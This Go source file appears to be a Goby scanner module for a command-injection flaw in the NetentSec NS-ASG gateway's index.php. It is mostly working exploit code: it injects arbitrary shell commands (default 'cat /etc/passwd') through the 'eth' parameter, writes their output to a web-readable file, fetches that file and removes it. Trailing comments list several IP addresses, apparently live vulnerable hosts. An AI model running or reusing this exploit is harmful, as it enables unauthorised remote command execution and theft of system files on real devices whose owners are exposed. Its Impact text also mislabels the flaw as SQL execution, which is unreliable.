package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Netentsec NS ASG index.php RCE",
    "Description": "NetentSec NS-ASG command injection can be GETSHELL",
    "Product": "NetentSec",
    "Homepage": "http://www.netentsec.com/",
    "DisclosureDate": "2021-06-04",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "cert=\"NetentSec\" || body=\"NS-ASG\" || app=\"Netentsec-NS-ASG-Security-gateway\" || app=\"netentsec Technology - Next Generation Firewall\"",
    "Level": "3",
    "Impact": "<p>Hackers can directly execute SQL statements to control the entire server: get data, modify data, delete data, etc.</p>",
    "Recommendation": "<p>1. The data entered by the user needs to be strictly filtered in the webpage code.</p><p>2. Deploy a web application firewall to monitor database operations</p><p>3. Upgrade to the latest version</p>",
    "References": [
        "http://wooyun.bystudent.com/static/bugs/wooyun-2014-058946.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10222"
}`

	fileName := goutils.RandomHexString(8)
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			maxNumber := rand.Intn(10000000000)
			minNumber := rand.Intn(100000000)
			cfgGet := httpclient.NewGetRequestConfig(fmt.Sprintf("/index.php?eth=eth0%%20;expr+%d+-+%d;\"", maxNumber, minNumber))
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(u, cfgGet)
			if err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, strconv.Itoa(maxNumber-minNumber))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/index.php?eth=eth0%%20;%s%%3E/Isc/third-party/httpd/htdocs/"+fileName+".txt;"+fileName, url.QueryEscape(cmd))
			cfgGet := httpclient.NewGetRequestConfig(uri)
			cfgGet.VerifyTls = false
			respGet, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			if !strings.Contains(respGet.Utf8Html, "vpnweb/index.php") {
				expResult.Success = false
				expResult.Output = "Maybe the Target was not Vulnerability\nPlease try again or Check the target"
				return expResult
			}
			cfgRes := httpclient.NewGetRequestConfig("/" + fileName + ".txt")
			cfgRes.VerifyTls = false
			cfgRm := httpclient.NewGetRequestConfig("/index.php?eth=eth0%20;rm%20-rf%20/Isc/third-party/httpd/htdocs/" + fileName + ".txt;" + fileName)
			cfgRm.VerifyTls = false
			respRes, errRes := httpclient.DoHttpRequest(expResult.HostInfo, cfgRes)
			httpclient.DoHttpRequest(expResult.HostInfo, cfgRm)
			if errRes == nil {
				expResult.Success = true
				expResult.Output = respRes.Utf8Html

			}

			return expResult

		},
	))
}

// https://113.106.91.145
// https://36.154.228.2:22
// https://36.154.228.2
// https://218.75.78.54:4443
// https://223.75.51.238:4433
// https://117.32.131.184:10001
